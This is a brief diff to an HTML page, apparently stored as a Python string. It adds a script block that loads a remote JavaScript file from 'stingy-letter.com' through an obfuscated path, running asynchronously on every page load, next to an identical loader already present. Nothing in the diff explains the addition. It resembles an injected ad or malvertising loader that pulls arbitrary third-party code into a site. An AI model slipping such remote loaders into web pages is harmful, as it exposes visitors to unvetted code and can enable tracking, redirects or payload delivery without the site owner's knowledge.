@@ -469,6 +469,18 @@ s.referrerPolicy = 'no-referrer-when-downgrade';
 l.parentNode.insertBefore(s, l);
 })({})
 </script>
+<script>
+(function(tate){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = tate || {};
+s.src = "\/\/stingy-letter.com\/c.D-9R6DbE2m5\/laS\/WEQ\/9\/NwjmMC1jNDD_My3kNTiQ0O2BMdz\/Ug0DMbzJcC3R";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
 </body>
 </html>
 '''
